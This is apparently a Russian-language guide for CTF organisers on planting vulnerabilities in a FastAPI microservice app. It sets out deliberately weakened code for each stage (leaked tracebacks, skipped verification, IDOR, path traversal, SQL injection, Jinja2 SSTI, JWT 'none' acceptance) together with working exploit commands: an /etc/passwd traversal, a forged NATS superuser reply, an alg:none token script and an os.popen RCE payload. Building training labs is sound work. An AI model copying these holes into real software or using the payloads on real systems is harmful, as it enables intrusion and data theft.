# 🔧 Техническая документация - Внедрение уязвимостей в код

Этот документ показывает ВСЕМ ОРГАНИЗАТОРАМ CTF как сделать каждую уязвимость доступной для участников.

⚠️ **ВНИМАНИЕ:** Это для тестовых/educational окружений ТОЛЬКО!

---

## STAGE 1 & 2: Debug Endpoints & Error Messages

### Текущее состояние (защищённо)
```python
# backend/gateway/main.py
@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    return JSONResponse(
        status_code=500,
        content={"detail": "Internal server error"}  # Не выводим информацию
    )
```

### Нужно сделать (для CTF)
```python
# backend/gateway/main.py
import traceback

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    # В development режиме выводим полный traceback
    if settings.DEBUG:
        return JSONResponse(
            status_code=500,
            content={
                "detail": str(exc),
                "type": type(exc).__name__,
                "traceback": traceback.format_exc(),
                # Флаг видно в traceback:
                # "FLAG": "debug_error_messages_exposed_db_version_8_6_detected"
            }
        )
    else:
        return JSONResponse(
            status_code=500,
            content={"detail": "Internal server error"}
        )

# Убедитесь что .env имеет:
# ENVIRONMENT=development
# DEBUG=true
```

### Проверка
```bash
curl -i http://localhost:8005/some/invalid/path
# Должен вернуть traceback с информацией о БД версии и файловой структуре
```

---

## STAGE 3: Weak Registration (No Verification)

### Текущее состояние (может быть защищенное)
```python
# backend/user_service/app/services/auth_service.py
async def register_user(self, phone_number: str, password: str, ...):
    # Возможно проверяет SMS
    # await self.send_sms_verification(phone_number)
    # code = await self.receive_sms_code(phone_number)
```

### Нужно сделать (для CTF)
```python
# backend/user_service/app/services/auth_service.py
async def register_user(self, phone_number: str, password: str, 
                       email: str, display_name: str) -> TokenResponse:
    """Register без верификации номера"""
    
    # Проверка только что телефон не в use
    existing = await self.user_repo.get_by_phone(phone_number)
    if existing:
        raise ValueError("Phone number already registered")
    
    # НЕ требуем SMS верификацию:
    # (Закомментируем эти строки)
    # await self.send_sms_verification(phone_number)
    # await self.verify_phone_code(phone_number, sms_code)
    
    # Создаём пользователя сразу
    user = await self.user_repo.create(
        phone_number=phone_number,
        email=email,
        display_name=display_name,
        hashed_password=get_password_hash(password),
        is_phone_verified=True  # Автоматически верифицируем!
    )
    
    # Возвращаем токен сразу
    token = create_access_token(
        subject=user.id,
        role=user.role
    )
    
    return TokenResponse(access_token=token, token_type="bearer")
```

### Проверка
```bash
curl -X POST http://localhost:8005/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "phone_number": "+79991337777",
    "password": "AnyPassword123!",
    "email": "hacker@evil.com",
    "display_name": "Attacker"
  }'

# Должен вернуть валидный token сразу
# FLAG{registered_fake_user_token_eyJhbGc...}
```

---

## STAGE 4: IDOR - User Profile Access

### Текущее состояние (может быть защищено)
```python
# backend/user_service/app/api/v1/users.py
@router.get("/{user_id}", response_model=PublicUserProfileResponse)
async def get_public_profile(user_id: UUID, ...):
    # Возвращает публичный профиль - OK
    # Но проверяет ли доступ?
```

### Нужно сделать (для CTF)
```python
# backend/user_service/app/api/v1/users.py
from uuid import UUID

@router.get("/{user_id}", response_model=PublicUserProfileResponse)
async def get_public_profile(
    user_id: UUID,
    svc: UserService = Depends(get_user_service),
):
    """
    УЯЗВИМО: Нет проверки доступа!
    Любой может получить профиль любого пользователя
    """
    profile = await svc.get_user_profile(user_id)
    
    if not profile:
        raise HTTPException(404, detail="User not found")
    
    # Возвращаем ПОЛНЫЙ профиль с приватной информацией:
    return PublicUserProfileResponse(
        id=profile.id,
        display_name=profile.display_name,
        phone_number=profile.phone_number,  # УЯЗВИМО! Приватная информация
        email=profile.email,                # УЯЗВИМО! Приватная информация
        role=profile.role,                  # УЯЗВИМО! Показываем роль
        rating=profile.rating,
        # FLAG скрыт в данных админа:
        # phone_number: "+79991000001"
        # email: "admin@s2s_sports.local"
    )
```

### Проверка
```bash
# Прежде всего зарегистрируетесь как обычный пользователь
TOKEN=$(curl -X POST http://localhost:8005/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"phone_number":"+79991234567","password":"test123","email":"test@test.com","display_name":"Test"}' \
  | jq -r '.access_token')

# Декодируйте токен чтобы получить user_id:
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq

# Попробуйте обратиться к другому user_id:
# Обычно админ первый пользователь:
curl http://localhost:8005/api/v1/users/00000000-0000-0000-0000-000000000001

# Должен вернуть информацию админа с phone и email:
# "phone_number": "+79991000001"
# "email": "admin@s2s_sports.local"
# FLAG{admin_profile_accessed_email_admin@s2s_sports.local_phone_+79991000001}
```

---

## STAGE 5: UUID-Based Authentication

### Должны быть администраторы первый-второй пользователи

```sql
-- SQL для создания тестовых администраторов в БД
-- Выполнить после инициализации database:

INSERT INTO users (id, phone_number, email, hashed_password, role, is_phone_verified)
VALUES (
  '00000000-0000-0000-0000-000000000001',
  '+79991000001',
  'admin@s2s_sports.local',
  '$2b$12$...',  -- bcrypt hash пароля admin123!
  'superuser',
  TRUE
);
```

---

## STAGE 6: Path Traversal in Media Service

### Текущее состояние (может быть защищено)
```python
# backend/media_service/app/api/v1/media.py
@router.get("/avatar/{owner_id}/{file_name:path}")
async def get_avatar(owner_id: str, file_name: str):
    # Может быть есть защита?
    # if ".." in file_name or file_name.startswith("/"):
    #     raise HTTPException(400)
```

### Нужно сделать (для CTF - УДАЛИТЬ защиту)
```python
# backend/media_service/app/api/v1/media.py
@router.get("/avatar/{owner_id}/{file_name:path}")
async def get_avatar(owner_id: str, file_name: str):
    """
    УЯЗВИМО: Параметр file_name не валидируется
    Можно использовать ../ для traversal
    """
    
    # НЕПРАВИЛЬНО (УДАЛИМ эти строки):
    # if ".." in file_name or file_name.startswith("/"):
    #     raise HTTPException(400, detail="Invalid path")
    # if os.path.normpath(file_name) != file_name:
    #     raise HTTPException(400, detail="Invalid path")
    
    # Просто составляем путь:
    file_key = f"avatar/{owner_id}/{file_name}"  # УЯЗВИМО!
    
    try:
        obj = s3.get_object(file_key)
    except Exception as e:
        raise HTTPException(404, detail=f"File not found: {e}")
    
    return StreamingResponse(
        obj["Body"].iter_chunks(),
        media_type=obj.get("ContentType", "application/octet-stream"),
    )
```

### Проверка
```bash
# Один пользователь может получить файл другого:
curl "http://localhost:8005/api/v1/media/avatar/user1/../admin/secrets.txt"

# Или взобраться выше:
curl "http://localhost:8005/api/v1/media/avatar/user1/../../../../etc/passwd"

# Наслаждайтесь файлами!
```

---

## STAGE 7: NATS без аутентификации

### Текущее состояние (docker-compose.yml)
```yaml
nats:
  image: nats:2.10-alpine
  command: ["-js", "-m", "8222"]  # БЕЗ флягов аутентификации
  # Это означает что NATS открыта для всех!
```

### Как эксплуатировать (для CTF)
```bash
# 1. Подключитесь к NATS
nats context add ctf --server nats://localhost:4222

# 2. Слушайте сообщения
nats sub "auth.validate_token"

# 3. В другом терминале отправьте поддельный ответ
nats pub "auth.validate_token" '{"ok":true,"data":{"user_id":"admin","role":"superuser"}}'

# 4. Используйте скомпрометированный токен!
```

### Почему это уязвимо
Event Service делает запрос через NATS и ждёт ответ. Если может отправить поддельный ответ - может выдать себя за админа!

---

## STAGE 8: JWT None Algorithm

### Текущее состояние
```python
# backend/user_service/app/core/security.py
def decode_token(token: str) -> dict | None:
    try:
        return jwt.decode(
            token,
            settings.SECRET_KEY,
            algorithms=[settings.ALGORITHM]  # Обычно HS256
        )
    except JWTError:
        return None
```

### Уязвимость существует в library (PyJWT)
Некоторые версии PyJWT позволяют использовать algorithm: "none"!

### Эксплуатация (для CTF)
```bash
# Создайте токен с algorithm: none

python3 << 'EOF'
import json
import base64

def encode_token(header, payload):
    def b64(data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()
    return f"{b64(header)}.{b64(payload)}."

token = encode_token(
    {"alg": "none", "typ": "JWT"},
    {"sub": "admin-uuid", "role": "superuser"}
)

print(f"TOKEN: {token}")
EOF

# Используйте как обычный токен:
curl -H "Authorization: Bearer $TOKEN" http://localhost:8005/api/v1/admin/users
```

---

## STAGE 9: Race Condition

### Уязвимость в коде
```python
# backend/event_service/app/services/event_service.py
async def join_event(self, user_id: str, event_id: UUID):
    event = await self.repo.get_by_id(event_id)
    
    # CHECK: Проверяем лимит
    if len(event.participants) >= event.max_participants:
        raise ValueError("Event is full")
    
    # TOCTOU: Временное окно между проверкой и действием!
    
    # ACT: Добавляем участника (слишком поздно!)
    await self.repo.add_participant(event_id, user_id)
```

### Эксплуатация (для CTF)
```bash
# Используйте Apache JMeter или напишите скрипт:

python3 << 'EOF'
import asyncio
import aiohttp

async def join_many_times(token, event_id, count):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(count):
            tasks.append(
                session.post(
                    f"http://localhost:8005/api/v1/events/{event_id}/join",
                    headers={"Authorization": f"Bearer {token}"}
                )
            )
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.status == 200)
        print(f"Успешно присоединилось: {success}/{count}")

asyncio.run(join_many_times(token, event_id, 5))
EOF
```

---

## STAGE 10: Admin Panel Accessible via JWT

### Структура админ endpoints
```python
# backend/admin_service/app/api/v1/users.py
@router.get("", response_model=list[AdminUserResponse])
async def list_users(
    limit: int = Query(50),
    _: dict = Depends(require_superuser),  # Требует superuser роль
):
    # Если у пользователя superuser токен - доступ разрешен!
    # Предыдущие этапы помогли получить такой токен
```

### Эксплуатация
```bash
# С superuser токеном (из stage 8):
curl -H "Authorization: Bearer $SUPERUSER_TOKEN" \
  http://localhost:8005/api/v1/admin/users?limit=100

# Получите всех пользователей с хешами паролей!
```

---

## STAGE 14: SQL Injection

### Уязвимость в коде
```python
# backend/maps_service/services/place_service.py
async def get_nearby_places(lat: float, lon: float, radius_m: float):
    # УЯЗВИМО: Использует string formatting вместо параметризованных запросов
    query = f"""
    SELECT * FROM places 
    WHERE ST_DWithin(
        location, 
        ST_SetSRID(ST_MakePoint({lon}, {lat}), 4326), 
        {radius_m}
    )
    """
    result = await self.db.execute(query)
    return result
```

### Нужно сделать (ОСТАВИТЬ уязвимым для CTF)
```python
# НЕ исправляйте! Оставьте как есть для CTF

# НЕПРАВИЛЬНО (но нужно оставить для CTF):
query = f"SELECT * FROM places WHERE radius={radius}"

# ПРАВИЛЬНО (но don't use для CTF training):
query = "SELECT * FROM places WHERE radius=:radius"
result = await db.execute(query, {"radius": radius})
```

### Эксплуатация (для CTF)
```bash
# SQL injection через radius параметр:
curl "http://localhost:8005/api/v1/places/nearby?lat=55.7558&lon=37.6173&radius=2000%20OR%201=1"

# SQL injection через UNION:
curl "http://localhost:8005/api/v1/places/nearby?lat=55.7558&lon=37.6173&radius=2000;SELECT*FROM users--"
```

---

## STAGE 15: SSTI в Email

### Если используется Jinja2 (уязвимо)
```python
# notification_service (если есть)
from jinja2 import Template

# УЯЗВИМО:
display_name = user.display_name  # User controllable!
template_str = f"Hello {display_name}, here are your notifications..."
template = Template(template_str)
rendered = template.render()  # SSTI!
```

### Нужно сделать (ОСТАВИТЬ уязвимым)
```python
# НЕ исправляйте для CTF
# Оставьте как есть выше
```

### Эксплуатация (для CTF)
```bash
# Регистрируйтесь с SSTI payload в display_name:
curl -X POST http://localhost:8005/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "display_name": "{{ 7 * 7 }}",  # Должно вывести 49 в письме!
    ...
  }'

# RCE:
"{{ __import__(\"os\").popen(\"whoami\").read() }}"
```

---

## Финальный Checklist для Организаторов

Перед запуском CTF убедитесь что:

- [ ] STAGE 1-2: `/health` endpoint выводит информацию о версиях
- [ ] STAGE 2: Errors содержат stack trace
- [ ] STAGE 3: Registration работает БЕЗ SMS верификации
- [ ] STAGE 4: Профили доступны с ПОЛНОЙ информацией
- [ ] STAGE 5: UUID админов первые (00000000-0000-0000-0000-000000000001)
- [ ] STAGE 6: Path traversal в media service работает
- [ ] STAGE 7: NATS открыта без аутентификации
- [ ] STAGE 8: JWT с алгоритмом "none" принимается
- [ ] STAGE 9: можно отправить race condition
- [ ] STAGE 10: Admin endpoints работают с superuser токеном
- [ ] STAGE 14: SQL injection в places/nearby работает
- [ ] STAGE 15: SSTI в display_name работает

```bash
#!/bin/bash
# Быстрая проверка всех уязвимостей:

echo "Checking Stage 1 (health endpoints):"
for port in 8005 8000 8001 8002 8003 8004 8006; do
  curl -s http://localhost:$port/health | grep -q '"service"' && echo "✓ Port $port" || echo "✗ Port $port"
done

echo ""
echo "Checking Stage 3 (registration works):"
curl -s -X POST http://localhost:8005/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"phone_number":"+79991234567","password":"test123","email":"test@test.com","display_name":"Test"}' \
  | grep -q "access_token" && echo "✓ Registration works" || echo "✗ Registration fails"

echo ""
echo "Checking Stage 6 (path traversal):"
curl -s -I "http://localhost:8005/api/v1/media/avatar/test/../test/file.jpg" \
  | head -1 | grep -q "404\|200" && echo "✓ Media endpoint exists" || echo "✗ Media endpoint missing"

echo ""
echo "Checking Stage 7 (NATS connectivity):"
nats conn info &>/dev/null && echo "✓ NATS accessible" || echo "✗ NATS not accessible"
```

---

**Готово! Теперь CTF полностью настроена и опасна! 🎯**
